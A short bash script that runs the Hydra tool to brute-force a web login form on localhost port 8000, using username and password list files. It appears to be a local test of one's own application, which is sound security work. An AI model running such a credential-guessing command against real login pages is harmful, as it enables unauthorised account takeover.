#!/bin/bash

hydra -f -I -V \
-L usernames.txt \
-P passwords.txt \
-s 8000 localhost \
http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
